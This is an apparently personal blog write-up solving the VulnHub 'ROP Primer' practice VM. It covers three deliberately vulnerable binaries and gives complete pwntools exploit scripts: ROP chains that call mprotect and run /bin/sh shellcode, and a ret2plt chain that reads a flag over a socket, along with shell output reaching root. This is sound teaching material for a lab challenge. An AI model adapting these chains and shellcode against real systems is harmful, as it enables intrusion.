---
layout: post
title: "A ROP Primer solution"
date: 2015-08-19 14:42:43 -0400
comments: true
categories: boot2root
---

So a while back, [barrebas](https://twitter.com/barrebas) from our [VulnHub CTF Team](https://ctf-team.vulnhub.com) decided to give us a primer on Return Oriented Programming (ROP). It was a great session and he went on to give the workshop at BSides London, which I hear was well received. Anyway, to accompany the workshop, he created a VM challenge containing three binaries that you get to practice exploiting using ROP. You can grab the VM at [https://www.vulnhub.com/entry/rop-primer-02,114/](https://www.vulnhub.com/entry/rop-primer-02,114/). I meant to do this ages ago, but procrastination, plus CTFs, plus work kind of put it on the shelf. So finally, I got bits of free time to work on it and here's my writeup on the challenges. 

<!--more-->

We're given the root password to login to the VM, as well as the user credentials for each account hosting each challenge. The first thing I noticed was ASLR was disabled, most likely to keep things simple. I solved all three binaries with it relatively easily, so then I thought, why not enable it and have a bit more fun? And so I did. 

For these challenges I used [gdb-peda](https://github.com/longld/peda), [ropper](https://github.com/sashs/Ropper), and [pwntools](https://github.com/Gallopsled/pwntools). My exploit for each challenge is heavily commented, so I won't go into how I chose what gadget and all that since to be honest I think it might just end up being confusing. It's best to understand the vulnerability yourself, and step through the exploit to see what's going on. 

### Level 0

This is a statically linked binary, so it's rich with ROP gadgets. It basically asks us for input, and then taunts us. EIP is overwritten at offset 44. So here it is with EIP overwritten with BBBB:

```
gdb-peda$ r
Starting program: /root/rop/0/level0 
[+] ROP tutorial level0
[+] What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
[+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbfbc0f3c --> 0x80ca720 --> 0xfbad2a84 
EDX: 0x80cb690 --> 0x0 
ESI: 0x80488e0 (<__libc_csu_fini>:  push   ebp)
EDI: 0x5206e156 
EBP: 0x41414141 ('AAAA')
ESP: 0xbfbc0f8c ("BBBB")
EIP: 0x804829b (<main+71>:  ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048290 <main+60>: call   0x8048d80 <printf>
   0x8048295 <main+65>: mov    eax,0x0
   0x804829a <main+70>: leave  
=> 0x804829b <main+71>: ret    
   0x804829c:   nop
   0x804829d:   nop
   0x804829e:   nop
   0x804829f:   nop
[------------------------------------stack-------------------------------------]
0000| 0xbfbc0f8c ("BBBB")
0004| 0xbfbc0f90 --> 0x0 
0008| 0xbfbc0f94 --> 0xbfbc1024 --> 0xbfbc1545 ("/root/rop/0/level0")
0012| 0xbfbc0f98 --> 0xbfbc102c --> 0xbfbc1558 ("XDG_VTNR=7")
0016| 0xbfbc0f9c --> 0x0 
0020| 0xbfbc0fa0 --> 0x0 
0024| 0xbfbc0fa4 --> 0x0 
0028| 0xbfbc0fa8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804829b in main ()
```

NX is enabled for all the challenges, so we can't just execute shellcode on the stack. My solution was to use mprotect() and make the stack executable, and then execute my shellcode on it. To make the stack executable, I needed a stack address, and one was conveniently placed in ECX. I just had to make a few adjustments to it. 

Here's the exploit: 

```python
#!/usr/bin/env python
from pwn import *


"""
mprotect: 
eax = 0x7d
ebx = address
ecx = size
edx = 0x7 (rwx)
"""

buf = ""
buf += "A"*44

# value to & stack address in ecx with
buf += p32(0x0806b893)  # pop eax; ret
buf += p32(0xfffff000)  # & stack address in ecx with ~0xfff

# eax now contains a stack address to mprotect
buf += p32(0x080841a1)  # and eax, ecx; ret; 

# need to have a valid value for ebp for the next gadget
buf += p32(0x08048550)  # pop ebp; ret
buf += p32(0xa9b0bb9b)  # pop into ebp so or [ebp+0x5e5bf465] is valid

# exchange eax and ebx. ebx now contains stack address. 
buf += p32(0x08083665)  # xchg eax, ebx; or byte ptr [ebp + 0x5e5bf465], cl; pop edi; pop ebp; ret; 
buf += "JUNK"
buf += "JUNK"

# size to mprotect goes into eax
buf += p32(0x0806b893)  # pop eax; ret
buf += p32(0x21000)

# exchange eax with ecx, so ecx now contains size to mprotect
buf += p32(0x08048105)  # xchg eax, ecx; ret; 

# set eax to sys_mprotect 0x7d
buf += p32(0x0806b893)  # pop eax; ret
buf += p32(0x7d)

# set edx to rwx permissions
buf += p32(0x080525c6) # pop edx; ret; 
buf += p32(0x7)

buf += p32(0x08052cf0)  # int 0x80; ret

# push esp which points to our shellcode and return to it
buf += p32(0x08055311)  # push esp; ret

buf += asm(shellcraft.linux.sh())

f = open("in.txt", "w")
f.write(buf)
f.close()
```

I ran the exploit, copied in.txt to the server, and tried it out:

```text
level0@rop:~$ (cat in.txt; cat) | ./level0
[+] ROP tutorial level0

[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��!
whoami
level1
cat flag
flag{rop_the_night_away}
```

Done. 

### Level 1

This challenge requires us to connect to a service running on port 8888. It offers us three different options, store, read, and exit. I found that the store command was vulnerable to a buffer overflow, and the last call to read() basically allows us to overwrite EIP. EIP is overwritten at offset 364. Now the description for this challenge hints that we just need to read the flag and we can use the calls to read()/write()/open() in the binary. So I solved it using ret2plt. 

First we call open() on the flag file. This will return a file descriptor 3. Call read() on the file descriptor and copy the contents of the flag to a known buffer. Finally, call write() on file descriptor 4 which is the socket file descriptor, and write the contents of the buffer over to us. 

```python
#!/usr/bin/env python
from pwn import *

r = remote("192.168.107.136", 8888)

filesize = 300
filename = "whatmeworry"

buf = ""
buf += "A"*312 + "B"*52

# call open() on "flag". this returns fd 3
buf += p32(0x80486d0)       # open()
buf += p32(0x8048ef7)       # pop2ret
buf += p32(0x8049128)       # "flag"
buf += p32(0)               # O_RDONLY

# read 123 bytes from fd 3 to a known buffer
buf += p32(0x8048640)       # read()
buf += p32(0x8048ef6)       # pop3ret
buf += p32(3)               # fd
buf += p32(0x804b008)       # buf
buf += p32(123)             # size

# sockfd is 4 based on previous calls to write(). 
# write contents of buffer with the flag to sockfd
buf += p32(0x8048700)       # write()
buf += p32(4)               # write syscall
buf += p32(4)               # sockfd
buf += p32(0x804b008)       # buf
buf += p32(123)             # size

print r.recvuntil(">")
log.info("sending: store")
r.sendline("store")

print r.recvuntil(">")
log.info("sending: " + str(filesize))
r.sendline(str(filesize))

print r.recvuntil(">")
log.info("sending: " + buf)
r.sendline(buf)

print r.recvuntil(">")
log.info("sending: " + filename)
r.sendline(filename)

print r.recvall()
```

And let's test it on the server:

```text
# ./sploit.py 
[+] Opening connection to 192.168.107.136 on port 8888: Done
Welcome to 
 XERXES File Storage System
  available commands are:
  store, read, exit.

>
[*] sending: store
  Please, how many bytes is your file?

>
[*] sending: 300
  Please, send your file:

>
[*] sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBІ\x0(\x91\x0\x00\x00\x00\x00@\x86\x0\x03\x00\x00\x0\xb0\x0{\x00\x00\x00\x00\x87\x0\x04\x00\x00\x00\x04\x00\x00\x0\xb0\x0{\x00\x00\x00
    XERXES is pleased to inform you
    that your file was received
        most successfully.
 Please, give a filename:
>
[*] sending: whatmeworry
[+] Recieving all data: Done (124B)
[*] Closed connection to 192.168.107.136 port 8888
 flag{just_one_rop_chain_a_day_keeps_the_doctor_away}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Win!

### Level 2

Ok the final level! This is similar to Level 0 except it uses strcpy() which means we have to deal with bad characters 0x00 and 0x0a. Also, it takes input as an argument rather than prompting us and waiting to read it in. My approach to this was basically the same as in Level 0; that is to make the stack executable using mprotect() and then return to my shellcode there. As before, EIP is overwritten at offset 44. 

```
gdb-peda$ r `python -c 'print "A"*44 + "BBBB"'`
Starting program: /root/rop/2/level2 `python -c 'print "A"*44 + "BBBB"'`
[+] ROP tutorial level2
[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbfe79d4c --> 0x80ca4c0 --> 0xfbad2a84 
EDX: 0x80cb430 --> 0x0 
ESI: 0x80488f0 (<__libc_csu_fini>:  push   ebp)
EDI: 0xdf7672b4 
EBP: 0x41414141 ('AAAA')
ESP: 0xbfe79d9c ("BBBB")
EIP: 0x80482a1 (<main+77>:  ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048296 <main+66>: call   0x8048d90 <printf>
   0x804829b <main+71>: mov    eax,0x0
   0x80482a0 <main+76>: leave  
=> 0x80482a1 <main+77>: ret    
   0x80482a2:   nop
   0x80482a3:   nop
   0x80482a4:   nop
   0x80482a5:   nop
[------------------------------------stack-------------------------------------]
0000| 0xbfe79d9c ("BBBB")
0004| 0xbfe79da0 --> 0x0 
0008| 0xbfe79da4 --> 0xbfe79e34 --> 0xbfe7b514 ("/root/rop/2/level2")
0012| 0xbfe79da8 --> 0xbfe79e40 --> 0xbfe7b558 ("XDG_VTNR=7")
0016| 0xbfe79dac --> 0x0 
0020| 0xbfe79db0 --> 0x0 
0024| 0xbfe79db4 --> 0x0 
0028| 0xbfe79db8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

The register layout is similar, with a stack address in ECX that I could use for mprotect(). After a bit of gadget juggling, I came up with the following exploit:

```python
#!/usr/bin/env python
from pwn import *

# execve /bin/sh
shellcode = (
    "\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68"
    "\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89"
    "\xe1\xb0\x0b\xcd\x80"
)

buf = ""
buf += "A"*40 
buf += p32(0xa9b0ab9b) # set ebp to a valid address when [ebp + 0x5e5bf465] is calculated later

# set eax to 0xfffff000
buf += p32(0x8083a30)   # pop eax; ret 0x80c
buf += p32(0xfeff7973)  
buf += p32(0x080831bc)  # add eax, 0x100768d; ret; 
buf += "z"*2060         # adjust for ret 0x80c

# set eax to stack address 
buf += p32(0x08083e81)  # and eax, ecx; ret; 

# move eax to ebx using xchg. ebp needs to return a valid address here
buf += p32(0x08083345)  # xchg eax, ebx; or byte ptr [ebp + 0x5e5bf465], cl; pop edi; pop ebp; ret; 
buf += "JUNK"           # pops into edi
buf += "JUNK"           # pops into ebp

# set edx to 7
buf += p32(0x08052476) # pop edx; ret; 
buf += p32(0xffffffff) # we'll increment this 8 times so it becomes 0x7
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 
buf += p32(0x0808f4f4) # inc edx; add al, -0x37; ret; 

# set ecx
buf += p32(0x080658d7) # pop ecx; adc al, -0x77; ret; 
buf += p32(0x10101010) # size to mprotect

# set eax to 0x7d
buf += p32(0x0804b128) # xor eax, eax; pop ebp; ret; 
buf += "JUNK"          # pops into ebp
buf += p32(0x0806f5c5) # sub al, -0x7d; ret

buf += p32(0x08052ba0) # int 0x80
buf += p32(0x0804eea0) # execute shellcode: push esp; ret;
buf += shellcode

print buf
```

Since pwntools isn't installed on the server, I saved the output of the exploit into in.txt and transferred that over. Here it is in action: 

```text
level2@rop:~$ ./level2 `cat in.txt`
[+] ROP tutorial level2
[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����sy��zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzJUNKJUNKv�����X(�JUNK�������1�Phn/shh//bi��P��S���
                                            
# whoami
root
# cat flag
flag{to_rop_or_not_to_rop}
```

Hooray!

To summarize, ROP Primer was fun. If you're not familiar with ROP, this is a good challenge to start practicing with. There are other ways to solve these challenges, so get creative and see what you can pull off. 
